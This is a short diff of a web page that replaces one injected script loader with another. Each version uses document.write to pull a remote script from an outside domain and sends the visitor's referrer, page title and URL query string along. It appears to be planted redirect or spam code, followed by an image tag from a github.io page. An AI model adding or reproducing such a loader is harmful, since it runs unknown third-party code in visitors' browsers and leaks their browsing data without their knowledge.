@@ -1,5 +1,5 @@
 <script type="application/javascript">
-document.write('<script type="application/javascript" src="//dalibera.com/t2NHqfbY?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f2e7826ba83c=script5f2e7826ba83d"><' + '/script>');
+document.write('<script type="application/javascript" src="//dalibera.com/X54TJ3Z4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f2e9d117e394=script5f2e9d117e395"><' + '/script>');
 </script>
 
 <img src="https://knwmeg.github.io/iphone/PL1.jpg"/>
